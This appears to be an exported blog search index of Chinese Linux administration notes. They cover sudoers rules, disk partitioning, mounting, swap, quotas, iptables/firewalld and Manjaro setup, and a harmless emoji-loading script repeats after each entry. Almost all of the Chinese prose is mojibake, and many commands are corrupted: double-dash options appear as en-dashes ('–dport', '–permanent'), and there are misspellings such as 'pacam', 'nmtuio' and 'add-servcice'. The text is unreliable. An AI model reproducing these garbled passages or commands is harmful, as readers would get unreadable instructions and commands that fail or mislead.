è¡Œï¼ˆå¤§çº¦ï¼‰å¡«å†™ä¸ŠæŒ‡å®šçš„ä¿¡æ¯ï¼šè°å¯ä»¥ä½¿ç”¨ å…è®¸ä½¿ç”¨çš„ä¸»æœº=(ä»¥è°çš„èº«ä»½) å¯æ‰§è¡Œå‘½ä»¤çš„åˆ—è¡¨xps ALL=(ALL) ALL å¦‚æœéœ€è¦è®©æŸä¸ªç”¨æˆ·åªèƒ½ä½¿ç”¨ root ç®¡ç†å‘˜çš„èº«ä»½æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ï¼Œåˆ‡è®°ä¸€å®šè¦ç»™å‡ºè¯¥å‘½ä»¤çš„ç»å¯¹è·¯å¾„ï¼Œå¦åˆ™ç³»ç»Ÿä¼šè¯†åˆ«ä¸å‡ºæ¥ã€‚å…ˆä½¿ç”¨ whereis å‘½ä»¤æ‰¾å‡ºå‘½ä»¤æ‰€å¯¹åº”çš„ä¿å­˜è·¯å¾„ï¼Œç„¶åæŠŠé…ç½®æ–‡ä»¶ç¬¬ 99 è¡Œçš„ç”¨æˆ·æƒé™å‚æ•°ä¿®æ”¹æˆå¯¹åº”çš„è·¯å¾„å³å¯xps ALL=(ALL) /usr/bin/cat åŠ  NOPASSWD å‚æ•°ï¼Œä½¿å¾—ç”¨æˆ·æ‰§è¡Œ sudo å‘½ä»¤æ—¶ä¸å†éœ€è¦å¯†ç éªŒè¯ï¼š xps ALL=NOPASSWD: /usr/sbin/poweroff ` document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ç”¨æˆ·èº«ä»½</tag>
        <tag>Linuxï¼Œæ–‡ä»¶æƒé™</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linuxå­˜å‚¨ç»“æ„ä¸ç£ç›˜åˆ’åˆ†]]></title>
    <url>%2Fposts%2F1e68cff8%2F</url>
    <content type="text"><![CDATA[å­˜å‚¨ç»“æ„ä¸ç£ç›˜åˆ’åˆ†/boot å¼€æœºæ‰€éœ€æ–‡ä»¶â€”å†…æ ¸ã€å¼€æœºèœå•ä»¥åŠæ‰€éœ€é…ç½®æ–‡ä»¶ç­‰ /dev ä»¥æ–‡ä»¶å½¢å¼å­˜æ”¾ä»»ä½•è®¾å¤‡ä¸æ¥å£ # /etc é…ç½®æ–‡ä»¶ # /home ç”¨æˆ·å®¶ç›®å½• # /bin å­˜æ”¾å•ç”¨æˆ·æ¨¡å¼ä¸‹è¿˜å¯ä»¥æ“ä½œçš„å‘½ä»¤ /lib å¼€æœºæ—¶ç”¨åˆ°çš„å‡½æ•°åº“ï¼Œä»¥åŠ/bin ä¸/sbin ä¸‹é¢çš„å‘½ä»¤è¦è°ƒç”¨çš„å‡½æ•° /sbin å¼€æœºè¿‡ç¨‹ä¸­éœ€è¦çš„å‘½ä»¤ /media ç”¨äºæŒ‚è½½è®¾å¤‡æ–‡ä»¶çš„ç›®å½• # /opt æ”¾ç½®ç¬¬ä¸‰æ–¹çš„è½¯ä»¶ /root ç³»ç»Ÿç®¡ç†å‘˜çš„å®¶ç›®å½• # /srv ä¸€äº›ç½‘ç»œæœåŠ¡çš„æ•°æ®æ–‡ä»¶ç›®å½• /tmp ä»»ä½•äººå‡å¯ä½¿ç”¨çš„â€œå…±äº«â€ä¸´æ—¶ç›®å½• /proc è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œä¾‹å¦‚ç³»ç»Ÿå†…æ ¸ã€è¿›ç¨‹ã€å¤–éƒ¨è®¾å¤‡åŠç½‘ç»œçŠ¶æ€ç­‰ # /usr/local ç”¨æˆ·è‡ªè¡Œå®‰è£…çš„è½¯ä»¶ # /usr/sbin Linux ç³»ç»Ÿå¼€æœºæ—¶ä¸ä¼šä½¿ç”¨åˆ°çš„è½¯ä»¶/å‘½ä»¤/è„šæœ¬ /usr/share å¸®åŠ©ä¸è¯´æ˜æ–‡ä»¶ï¼Œä¹Ÿå¯æ”¾ç½®å…±äº«æ–‡ä»¶ # /var ä¸»è¦å­˜æ”¾ç»å¸¸å˜åŒ–çš„æ–‡ä»¶ï¼Œå¦‚æ—¥å¿— # /lost+found å½“æ–‡ä»¶ç³»ç»Ÿå‘ç”Ÿé”™è¯¯æ—¶ï¼Œå°†ä¸€äº›ä¸¢å¤±çš„æ–‡ä»¶ç‰‡æ®µå­˜æ”¾åœ¨è¿™é‡Œ å¸¸è§çš„ç¡¬ä»¶è®¾å¤‡åŠå…¶æ–‡ä»¶åç§° IDE è®¾å¤‡ /dev/hd[a-d] SCSI/SATA/U ç›˜ /dev/sd[a-p] è½¯é©± /dev/fd[0-1] æ‰“å°æœº /dev/lp[0-15] å…‰é©± /dev/cdrom é¼ æ ‡ /dev/mouse ç£å¸¦æœº /dev/st0 æˆ–/dev/ht0 ç³»ç»Ÿé‡‡ç”¨ aï½p æ¥ä»£è¡¨ 16 å—ä¸åŒçš„ç¡¬ç›˜ï¼ˆé»˜è®¤ä» a å¼€å§‹åˆ†é…ï¼‰ï¼Œè€Œä¸”ç¡¬ç›˜çš„åˆ†åŒºç¼–å·ä¹Ÿå¾ˆæœ‰è®²ç©¶ï¼š â¢ ä¸»åˆ†åŒºæˆ–æ‰©å±•åˆ†åŒºçš„ç¼–å·ä» 1 å¼€å§‹ï¼Œåˆ° 4 ç»“æŸï¼› â¢ é€»è¾‘åˆ†åŒºä»ç¼–å· 5 å¼€å§‹ã€‚ ä¸»åˆ†åŒºä¸èƒ½è¶…è¿‡ 4 ä¸ª æŒ‚è½½ç¡¬ä»¶è®¾å¤‡mount å‘½ä»¤`ç”¨äºæŒ‚è½½æ–‡ä»¶ç³»ç»Ÿï¼Œæ ¼å¼ä¸ºâ€œmount æ–‡ä»¶ç³»ç»Ÿ æŒ‚è½½ç›®å½•â€mount å‘½ä»¤ä¸­çš„å‚æ•°ä»¥åŠä½œç”¨-a æŒ‚è½½æ‰€æœ‰åœ¨/etc/fstab ä¸­å®šä¹‰çš„æ–‡ä»¶ç³»ç»Ÿ ,æ‰§è¡Œåè‡ªåŠ¨æ£€æŸ¥/etc/fstab æ–‡ä»¶ä¸­æœ‰æ— ç–æ¼è¢«æŒ‚è½½çš„è®¾å¤‡æ–‡ä»¶ï¼Œå¦‚æœæœ‰ï¼Œåˆ™è¿›è¡Œè‡ªåŠ¨æŒ‚è½½æ“ä½œ-t æŒ‡å®šæ–‡ä»¶ç³»ç»Ÿçš„ç±»å‹ ä¾‹å¦‚ï¼Œè¦æŠŠè®¾å¤‡/dev/sdb2 æŒ‚è½½åˆ°/backup ç›®å½•:mount /dev/sdb2 /backup # é‡å¯åæŒ‚è½½å°±ä¼šå¤±æ•ˆ #æ°¸ä¹…é…ç½®æŠŠæŒ‚è½½ä¿¡æ¯æŒ‰ç…§æŒ‡å®šçš„å¡«å†™æ ¼å¼â€œè®¾å¤‡æ–‡ä»¶ æŒ‚è½½ç›®å½• æ ¼å¼ç±»å‹ æƒé™é€‰é¡¹ æ˜¯å¦å¤‡ä»½ æ˜¯å¦è‡ªæ£€â€å†™å…¥åˆ° /etc/fstab æ–‡ä»¶ä¸­ #ç”¨äºæŒ‚è½½ä¿¡æ¯çš„æŒ‡å®šå¡«å†™æ ¼å¼ä¸­ï¼Œå„å­—æ®µæ‰€è¡¨ç¤ºçš„æ„ä¹‰è®¾å¤‡æ–‡ä»¶ ä¸€ èˆ¬ ä¸º è®¾ å¤‡ çš„ è·¯ å¾„ + è®¾ å¤‡ å ç§° ï¼Œ ä¹Ÿ å¯ ä»¥ å†™ å”¯ ä¸€ è¯† åˆ« ç  ï¼ˆ UUID ï¼ŒUniversally Unique Identifierï¼‰æŒ‚è½½ç›®å½• æŒ‡å®šè¦æŒ‚è½½åˆ°çš„ç›®å½•ï¼Œéœ€åœ¨æŒ‚è½½å‰åˆ›å»ºå¥½æ ¼å¼ç±»å‹ æŒ‡å®šæ–‡ä»¶ç³»ç»Ÿçš„æ ¼å¼ï¼Œæ¯”å¦‚ Ext3ã€ Ext4ã€ XFSã€ SWAPã€ iso9660ï¼ˆæ­¤ä¸ºå…‰ç›˜è®¾å¤‡ï¼‰ç­‰æƒé™é€‰é¡¹ è‹¥è®¾ç½®ä¸º defaultsï¼Œåˆ™é»˜è®¤æƒé™ä¸ºï¼š rw, suid, dev, exec, auto, nouser, asyncæ˜¯å¦å¤‡ä»½ è‹¥ä¸º 1 åˆ™å¼€æœºåä½¿ç”¨ dump è¿›è¡Œç£ç›˜å¤‡ä»½ï¼Œä¸º 0 åˆ™ä¸å¤‡ä»½æ˜¯å¦è‡ªæ£€ è‹¥ä¸º 1 åˆ™å¼€æœºåè‡ªåŠ¨è¿›è¡Œç£ç›˜è‡ªæ£€ï¼Œä¸º 0 åˆ™ä¸è‡ªæ£€ #ä¾‹å¦‚ï¼šå°†æ–‡ä»¶ç³»ç»Ÿä¸º ext4 çš„ç¡¬ä»¶è®¾å¤‡/dev/sdb2 åœ¨å¼€æœºåè‡ªåŠ¨æŒ‚è½½åˆ°/backup ç›®å½•ä¸Šï¼Œå¹¶ä¿æŒé»˜è®¤æƒé™ä¸”æ— éœ€å¼€æœºè‡ªæ£€vim /etc/fstab /dev/sdb2 /backup ext4 defaults 0 0 **umount å‘½ä»¤** umount [æŒ‚è½½ç‚¹/è®¾å¤‡æ–‡ä»¶] umount /dev/sdb2 - æ·»åŠ ç¡¬ç›˜è®¾å¤‡ #æ“ä½œæ€è·¯ï¼šé¦–å…ˆéœ€è¦åœ¨è™šæ‹Ÿæœºä¸­æ¨¡æ‹Ÿæ·»åŠ å…¥ä¸€å—æ–°çš„ç¡¬ç›˜å­˜å‚¨è®¾å¤‡ï¼Œç„¶åå†è¿›è¡Œåˆ†åŒºã€æ ¼å¼åŒ–ã€æŒ‚è½½ç­‰æ“ä½œï¼Œæœ€åé€šè¿‡æ£€æŸ¥ç³»ç»Ÿçš„æŒ‚è½½çŠ¶æ€å¹¶çœŸå®åœ°ä½¿ç”¨ç¡¬ç›˜æ¥éªŒè¯ç¡¬ç›˜è®¾å¤‡æ˜¯å¦æˆåŠŸæ·»åŠ  ç°åœ¨è™šæ‹Ÿæœºä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„è™šæ‹Ÿç¡¬ç›˜ **fdisk å‘½ä»¤** â€œfdisk [ç£ç›˜åç§°]â€ï¼Œå®ƒæä¾›äº†é›†æ·»åŠ ã€åˆ é™¤ã€è½¬æ¢åˆ†åŒºç­‰åŠŸèƒ½äºä¸€èº«çš„â€œä¸€ç«™å¼åˆ†åŒºæœåŠ¡â€äº¤äº’å¼ #fdisk å‘½ä»¤ä¸­çš„å‚æ•°ä»¥åŠä½œç”¨m æŸ¥çœ‹å…¨éƒ¨å¯ç”¨çš„å‚æ•°n æ·»åŠ æ–°çš„åˆ†åŒºd åˆ é™¤æŸä¸ªåˆ†åŒºä¿¡æ¯l åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„åˆ†åŒºç±»å‹t æ”¹å˜æŸä¸ªåˆ†åŒºçš„ç±»å‹p æŸ¥çœ‹åˆ†åŒºä¿¡æ¯w ä¿å­˜å¹¶é€€å‡ºq ä¸ä¿å­˜ç›´æ¥é€€å‡º ===åœ¨ç¡®è®¤åˆ›å»ºä¸€ä¸ªä¸»åˆ†åŒºåï¼Œç³»ç»Ÿè¦æ±‚æ‚¨å…ˆè¾“å…¥ä¸»åˆ†åŒºçš„ç¼–å·ã€‚æˆ‘ä»¬åœ¨å‰æ–‡å¾—çŸ¥ï¼Œä¸»åˆ†åŒºçš„ç¼–å·èŒƒå›´æ˜¯ 1ï½4ï¼Œå› æ­¤è¿™é‡Œè¾“å…¥é»˜è®¤çš„ 1 å°±å¯ä»¥äº†.æ¥ä¸‹æ¥ç³»ç»Ÿä¼šæç¤ºå®šä¹‰èµ·å§‹çš„æ‰‡åŒºä½ç½®ï¼Œè¿™ä¸éœ€è¦æ”¹åŠ¨ï¼Œæˆ‘ä»¬æ•²å‡»å›è½¦é”®ä¿ç•™é»˜è®¤è®¾ç½®å³å¯ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è®¡ç®—å‡ºæœ€é å‰çš„ç©ºé—²æ‰‡åŒºçš„ä½ç½®ã€‚æœ€åï¼Œç³»ç»Ÿä¼šè¦æ±‚å®šä¹‰åˆ†åŒºçš„ç»“æŸæ‰‡åŒºä½ç½®ï¼Œè¿™å…¶å®å°±æ˜¯è¦å»å®šä¹‰æ•´ä¸ªåˆ†åŒºçš„å¤§å°æ˜¯å¤šå°‘ã€‚æˆ‘ä»¬ä¸ç”¨å»è®¡ç®—æ‰‡åŒºçš„ä¸ªæ•°ï¼Œåªéœ€è¦è¾“å…¥+2G å³å¯åˆ›å»ºå‡ºä¸€ä¸ªå®¹é‡ä¸º 2GB çš„ç¡¬ç›˜åˆ†åŒº æ•²å‡»å‚æ•° w åå›è½¦ï¼Œè¿™æ ·åˆ†åŒºä¿¡æ¯æ‰æ˜¯çœŸæ­£çš„å†™å…¥æˆåŠŸå•¦ ===ä½¿ç”¨ file å‘½ä»¤æŸ¥çœ‹è¯¥æ–‡ä»¶çš„å±æ€§,file /dev/sdb1å¯ä»¥è¾“å…¥ partprobe å‘½ä»¤æ‰‹åŠ¨å°†åˆ†åŒºä¿¡æ¯åŒæ­¥åˆ°å†…æ ¸ï¼Œè€Œä¸”ä¸€èˆ¬æ¨èè¿ç»­ä¸¤æ¬¡æ‰§è¡Œè¯¥å‘½ä»¤ï¼Œæ•ˆæœä¼šæ›´å¥½ã€‚å¦‚æœä½¿ç”¨è¿™ä¸ªå‘½ä»¤éƒ½æ— æ³•è§£å†³é—®é¢˜ï¼Œé‚£ä¹ˆå°±é‡å¯è®¡ç®—æœºå§partprobepartprobefile /dev/sdb1 ===mkfså¦‚æœç¡¬ä»¶å­˜å‚¨è®¾å¤‡æ²¡æœ‰è¿›è¡Œæ ¼å¼åŒ–ï¼Œåˆ™ Linux ç³»ç»Ÿæ— æ³•å¾—çŸ¥æ€ä¹ˆåœ¨å…¶ä¸Šå†™å…¥æ•°æ®ã€‚å› æ­¤ï¼Œåœ¨å¯¹å­˜å‚¨è®¾å¤‡è¿›è¡Œåˆ†åŒºåè¿˜éœ€è¦è¿›è¡Œæ ¼å¼åŒ–æ“ä½œã€‚åœ¨ Linux ç³»ç»Ÿä¸­ç”¨äºæ ¼å¼åŒ–æ“ä½œçš„å‘½ä»¤æ˜¯mkfsã€‚è¿™æ¡å‘½ä»¤å¾ˆæœ‰æ„æ€ï¼Œå› ä¸ºåœ¨ Shell ç»ˆç«¯ä¸­è¾“å…¥ mkfs ååå†æ•²å‡»ä¸¤ä¸‹ç”¨äºè¡¥é½å‘½ä»¤çš„ Tabé”® mkfs.æ–‡ä»¶ç±»å‹åç§° #ä¾‹å¦‚:è¦æ ¼å¼åˆ†åŒºä¸º XFS çš„æ–‡ä»¶ç³»ç»Ÿ mkfs.xfs /dev/sdb1 ===æŒ‚è½½å¹¶ä½¿ç”¨å­˜å‚¨è®¾å¤‡æ­¥éª¤ï¼šé¦–å…ˆæ˜¯åˆ›å»ºä¸€ä¸ªç”¨äºæŒ‚è½½è®¾å¤‡çš„æŒ‚è½½ç‚¹ç›®å½•ï¼›ç„¶åä½¿ç”¨ mount å‘½ä»¤å°†å­˜å‚¨è®¾å¤‡ä¸æŒ‚è½½ç‚¹è¿›è¡Œå…³è”ï¼›æœ€åä½¿ç”¨ df -h å‘½ä»¤æ¥æŸ¥çœ‹æŒ‚è½½çŠ¶æ€å’Œç¡¬ç›˜ä½¿ç”¨é‡ä¿¡æ¯ã€‚ mkdir /newFS mount /dev/sdb1 /newFS/ df -h **du å‘½ä»¤** æŸ¥çœ‹æ–‡ä»¶æ•°æ®å ç”¨é‡æ ¼å¼ä¸ºâ€œdu [é€‰é¡¹] [æ–‡ä»¶]â€ du -sh /* å‘½ä»¤ æ¥æŸ¥çœ‹åœ¨ Linux ç³»ç»Ÿæ ¹ç›®å½•ä¸‹æ‰€æœ‰ä¸€çº§ç›®å½•åˆ†åˆ«å ç”¨çš„ç©ºé—´å¤§å° - **æ·»åŠ äº¤æ¢åˆ†åŒº** ä¸ºäº†è§£å†³çœŸå®ç‰©ç†å†…å­˜ä¸è¶³çš„é—®é¢˜ ,é€šè¿‡åœ¨ç¡¬ç›˜ä¸­é¢„å…ˆåˆ’åˆ†ä¸€å®šçš„ç©ºé—´ï¼Œç„¶åå°†æŠŠå†…å­˜ä¸­æš‚æ—¶ä¸å¸¸ç”¨çš„æ•°æ®ä¸´æ—¶å­˜æ”¾åˆ°ç¡¬ç›˜ä¸­ï¼Œä»¥ä¾¿è…¾å‡ºç‰©ç†å†…å­˜ç©ºé—´è®©æ›´æ´»è·ƒçš„ç¨‹åºæœåŠ¡æ¥ä½¿ç”¨çš„æŠ€æœ¯ #äº¤æ¢åˆ†åŒºçš„åˆ’åˆ†å»ºè®®ï¼šåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œäº¤æ¢åˆ†åŒºçš„å¤§å°ä¸€èˆ¬ä¸ºçœŸå®ç‰©ç†å†…å­˜çš„ 1.5ï½2 å€ï¼Œä¸ºäº†è®©å¤§å®¶æ›´æ˜æ˜¾åœ°æ„Ÿå—äº¤æ¢åˆ†åŒºç©ºé—´çš„å˜åŒ–ï¼Œè¿™é‡Œå–å‡ºä¸€ä¸ªå¤§å°ä¸º 5GB çš„ä¸»åˆ†åŒºä½œä¸ºäº¤æ¢åˆ†åŒºèµ„æºã€‚åœ¨åˆ†åŒºåˆ›å»ºå®Œæ¯•åä¿å­˜å¹¶é€€å‡ºå³å¯ï¼š ==SWAP åˆ†åŒºä¸“ç”¨çš„æ ¼å¼åŒ–å‘½ä»¤ mkswapmkswap /dev/sdb2 ä½¿ç”¨ swapon å‘½ä»¤æŠŠå‡†å¤‡å¥½çš„ SWAP åˆ†åŒºè®¾å¤‡æ­£å¼æŒ‚è½½åˆ°ç³»ç»Ÿä¸­ã€‚swapon /dev/sdb5 free -m æŸ¥çœ‹äº¤æ¢åˆ†åŒºçš„å¤§å°å˜åŒ– vim /etc/fstab/dev/sdb2 swap swap defaults 0 0 - **ç£ç›˜å®¹é‡é…é¢ quota** #ä»‹ç»quota â€“ é™åˆ¶æ¯ä¸ªäººèƒ½å¤Ÿä½¿ç”¨çš„ç£ç›˜å®¹é‡ inode ä¸ªæ•° isoft # åªæ˜¯è­¦å‘Šæé†’ï¼Œæ—¥å¿— ihard # å¼ºåˆ¶é™åˆ¶block å®¹é‡ defaults xfs_uquota #xfs_uquota -x -c â€˜limit bsoft=3m bhard=6m isoft=3 ihard=6 xpsâ€™ /boot **edquota ä¿®æ”¹é…é¢** edquota xps - è½¯ç¡¬æ–¹å¼é“¾æ¥ ln å‘½ä»¤æ ¼å¼ä¸ºâ€œln [é€‰é¡¹] ç›®æ ‡ #å‚æ•°-s åˆ›å»ºâ€œç¬¦å·é“¾æ¥â€ï¼ˆå¦‚æœä¸å¸¦-s å‚æ•°ï¼Œåˆ™é»˜è®¤åˆ›å»ºç¡¬é“¾æ¥ï¼‰-f å¼ºåˆ¶åˆ›å»ºæ–‡ä»¶æˆ–ç›®å½•çš„é“¾æ¥-i è¦†ç›–å‰å…ˆè¯¢é—®-v æ˜¾ç¤ºåˆ›å»ºé“¾æ¥çš„è¿‡ç¨‹ #ç¡¬è¿æ¥ -&gt; æºæ–‡ä»¶åˆ é™¤ä¹Ÿæ²¡äº‹ - å‰–ællæ–‡ä»¶å‚æ•°ä¿¡æ¯ -rw-râ€“râ€“. 1 root root 813 Apr 15 2014 yum.conf . -&gt; facl +1 å¤šå°‘å—813 å ç”¨å®é™…å¤§å° Apr 15 2014 æœ€åä¿®æ”¹æ–‡ä»¶çš„æ—¶é—´ ` document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>rhel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptablesä¸firewall]]></title>
    <url>%2Fposts%2Fa3db7b71%2F</url>
    <content type="text"><![CDATA[iptablesä¸firewallé˜²ç«å¢™ é…ç½®ç½‘å¡æ–‡ä»¶ ä¿®æ”¹é…ç½®æ–‡ä»¶`vim /etc/sysconfig/network-scripts/ifcfg-eno16777736 #æ–‡ä»¶å†…å®¹å¦‚ä¸‹HWADDR=â€00:0C:29:C2:F1:76â€TYPE=â€Ethernetâ€ #ç±»å‹BOOTPROTO=â€dhcpâ€DEFROUTE=â€yesâ€PEERDNS=â€yesâ€PEERROUTES=â€yesâ€IPV4_FAILURE_FATAL=â€noâ€IPV6INIT=â€yesâ€IPV6_AUTOCONF=â€yesâ€IPV6_DEFROUTE=â€yesâ€IPV6_PEERDNS=â€yesâ€IPV6_PEERROUTES=â€yesâ€IPV6_FAILURE_FATAL=â€noâ€NAME=â€eno16777736â€UUID=â€af3aaad5-b615-493c-872e-76503b9adad5â€ #å”¯ä¸€æ ‡è¯†ONBOOT=â€yesâ€ #å¼€æœºè‡ªå¯ 2. åŸºäºå›¾å½¢ç•Œé¢é…ç½®ç½‘å¡ **nmtuio** nmtuio systemctl restart network 3. nm-connection-editorå·¥å…· nm-connection-editor 4. å›¾å½¢ç•Œé¢ç‚¹å‡»å³ä¸Šè§’ - **é…ç½®é˜²ç«å¢™** è§„åˆ™ï¼š è‡ªä¸Šè€Œä¸‹åšåŒ¹é… å‡ ç§çŠ¶æ€ accept å…è®¸æµé‡é€šè¿‡reject æ˜ç¡®æ‹’ç»drop å¯¹æ–¹ä¸çŸ¥é“ä½ æ˜¯å¦åœ¨çº¿(æ˜¾ç¤ºè¶…æ—¶) 1. **iptables** æ¯”è¾ƒè€,é€æ¸è¢«å–ä»£åŸºäºå‘½ä»¤è¡Œéš¾åº¦æœ€é«˜ iptables -L #æ˜¾ç¤ºæ‰€æœ‰çš„ç­–ç•¥iptables -F #æ¸…ç©ºæ‰€æœ‰ç­–ç•¥iptables -P INPUT DROP #é»˜è®¤ç¦æ­¢æ‰€æœ‰æµé‡ç­–ç•¥,ä¸èƒ½reject -I #æ’å…¥åˆ°æœ€å‰é¢-A #æ’å…¥åˆ°æœ€åé¢-p # å…è®¸çš„åè®®â€“dport #æœ¬æœºç«¯å£-s #æ¥æº-j #æœ¬èº«ä¸ºæ„ä¹‰ï¼Œåé¢è·ŸåŠ¨ä½œ iptables -I INPUT -p icmp -j ACCEPT #åªå…è®¸å¤–éƒ¨åˆ°å†…éƒ¨çš„ping iptables -I INPUT -s 192.168.10.0/24 -p tcp â€“dport 22 #å…è®¸æ¥è‡ªæŸä¸ªç½‘æ®µçš„è®¿é—®ï¼Œç«¯å£ä¸º22 -D #åˆ é™¤æŸä¸€æ¡iptables -D INPUT 1 #åˆ é™¤ç¬¬ä¸€æ¡ iptables -I INPUT -p tcp â€“port 22 -j REJECT #ç¦æ­¢å¤–éƒ¨æ‰€æœ‰22ç«¯å£çš„æµé‡ iptables -I INPUT -p tcp â€“port 22:200 -j REJECT #ç¦æ­¢å¤–éƒ¨æ‰€æœ‰20åˆ°200ç«¯å£çš„æµé‡ service iptables save **firewalld é˜²ç«å¢™(åˆ†ä¸ºä¸‹é¢ä¸¤ä¸ª)** zone åŒºåŸŸsbit å®‰å…¨ä½public é»˜è®¤ç­–ç•¥,å½“å‰ä½¿ç”¨ 2. **firewall-cmd å‘½ä»¤è¡Œ** Runtime å½“å‰ç”Ÿæ•ˆï¼Œé‡å¯åå¤±æ•ˆPremanent å½“å‰æš‚æ—¶ä¸ç”Ÿæ•ˆï¼Œä½†æ˜¯æ°¸ä¹…ç”Ÿæ•ˆâ€“premanent # å»ºè®®æ·»åŠ è¿™ä¸ª firewall-cmd -reload #é‡å¯ firewall-cmd â€“get-default-zone #æŸ¥çœ‹å½“å‰åŒºåŸŸ firewall-cmd â€“set-default-zone=drop #åˆ‡æ¢é»˜è®¤åŒºåŸŸåˆ°ä¸¢åŒ… firewall-cmd â€“permanent â€“zone=drop â€“change-interface=en0167777 #é‡å¯ä¹‹åï¼ŒæŠŠè¿™ä¸ªç½‘å¡åŒºåŸŸæ¢ä¸ºdropfirewall-cmd â€“permanent get-zone-of-interface=en0167777 #é‡å¯ä¹‹åï¼ŒæŸ¥çœ‹ ç´§æ€¥æ¨¡å¼firewall-cmd â€“panic-on #åˆ‡æ–­æ‰€æœ‰ç½‘ç»œè¿æ¥ï¼ŒåŒ…æ‹¬pingçš„æ•°æ®åŒ…firewall-cmd â€“panic-off #å…³é—­ç´§æ€¥æ¨¡å¼ æŸ¥è¯¢æœåŠ¡firewall-cmd â€“zone=public â€“query-service=http #æŸ¥çœ‹æ˜¯å¦å…è®¸httpfirewall-cmd â€“zone=public â€“query-service=ssh æ·»åŠ å…è®¸æœåŠ¡firewall-cmd â€“zone=public â€“add-servcice=http #å…è®¸ä»å¤–è®¿é—®httpæœåŠ¡ firewall-cmd â€“zone=public â€“add-servcice=https #é‡å¯æ‰å¯ä»¥ firewall-cmd â€“reloadfirewall-cmd â€“zone=public â€“add-servcice=https ç¦æ­¢æœåŠ¡firewall-cmd â€“zone=public â€“remove-servcice=https firewall-cmd â€“permanent â€“zone=public â€“add-servcice=httpsfirewall-cmd â€“permanent â€“zone=public â€“query-servcice=https æ·»åŠ ç«¯å£å·firewall-cmd â€“zone=public â€“add-port=8080/tcp #æŠŠè¿™ä¸ªç«¯å£æ·»åŠ åˆ°ctpåè®®ç»„ï¼Œå…è®¸firewall-cmd â€“zone=public â€“add-port=80-90/tcp #ç«¯å£ç«¯ ç«¯å£è½¬å‘ï¼ˆéšè—åŸå§‹ç«¯å£ï¼‰firewall-cmd â€“permanent â€“zone=public â€“add-forward-port=888:porto:tcp:toport=22:toaddr=192.168.10.10 #è½¬å‘888åˆ°22firewall-cmd â€“reload å¯Œè§„åˆ™ï¼ˆå¤è§„åˆ™ï¼‰ç²¾å‡†åŒ¹é…firewall-cmd â€“permanent â€“zone=public â€“add-rich-rule=â€rule familyâ€=â€ipv4â€ source address=â€192.168.10.0/24â€ service name=â€sshâ€ rejectâ€ firewall-cmd reload 3. **firewall-config å›¾å½¢åŒ–** firewall-config 4. **TCP Wrappers** ï¼ˆä¼˜å…ˆçº§ï¼šå…ˆåŒ¹é…å…è®¸ï¼Œå†åŒ¹é…æ‹’ç»ï¼‰/etc/hosts.allow #ç™½åå• å…è®¸æœåŠ¡åç§°ã€IPåœ°å€/etc/hosts.deny #é»‘åå• æ‹’ç»æœåŠ¡åç§°ã€IPåœ°å€ ç™½åå•(ç¼–è¾‘åå°±ç”Ÿæ•ˆ)sshd:192.168.10.0/24 #å…è®¸è¿™ä¸ªç½‘æ®µçš„ä¸»æœºè®¿é—® é»‘åå•(ç¼–è¾‘åå°±ç”Ÿæ•ˆ)sshd:192.168.10.* # æ‰€æœ‰ä¸»æœºï¼Œé€šé…ç¬¦ ` 1.2.3. æ•°æ®é“¾è·¯å±‚ï¼ˆåè®®ï¼Œç«¯å£å·ï¼Œæ¥è®¿IPåœ°å€ï¼‰ åº”ç”¨å±‚ï¼ˆæœåŠ¡åç§°ï¼‰ å››ä¸ªå·¥å…·ï¼Œåªè¦æœ‰ä¸€ä¸ªæŠŠä»–ç¦æ­¢ï¼Œå°±ç¦æ­¢äº†ï¼ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>é˜²ç«å¢™</tag>
        <tag>rhel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Manjaro å®‰è£…ä¹‹å åŸºæœ¬é…ç½®]]></title>
    <url>%2Fposts%2F1319baa3%2F</url>
    <content type="text"><![CDATA[Manjaro å®‰è£…ä¹‹å åŸºæœ¬é…ç½®é…ç½®å›½å†…æº sudo pacman-mirrors -i -c China -m rank #å¼¹å‡ºæ¥æ¡†ï¼Œæˆ‘é€‰æ‹©çš„æ¸…åçš„æº å‡çº§ç³»ç»Ÿ sudo pacman -Syy &amp;&amp; sudo pacam -Syyu å®‰è£…vim sudo pacman -S vim æ·»åŠ archæº sudo vim /etc/pacman.conf #åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ ï¼Œæˆ‘æ·»åŠ çš„æ¸…åçš„ å®‰è£…archlinuxcnç­¾åé’¥åŒ™(å¯¼å…¥ GPG keyï¼Œå¦åˆ™çš„è¯keyéªŒè¯å¤±è´¥ä¼šå¯¼è‡´æ— æ³•å®‰è£…è½¯ä»¶) sudo pacman -Syy &amp;&amp; sudo pacman -S archlinuxcn-keyring å®‰è£…ç½‘ç»œå·¥å…·åŒ…ï¼Œifconfigç­‰ pacman -S net-tools dnsutils inetutils iproute2 å®‰è£…sogouæ‹¼éŸ³è¾“å…¥æ³• sudo pacman -S fcitx-im # å®‰è£…fcitx 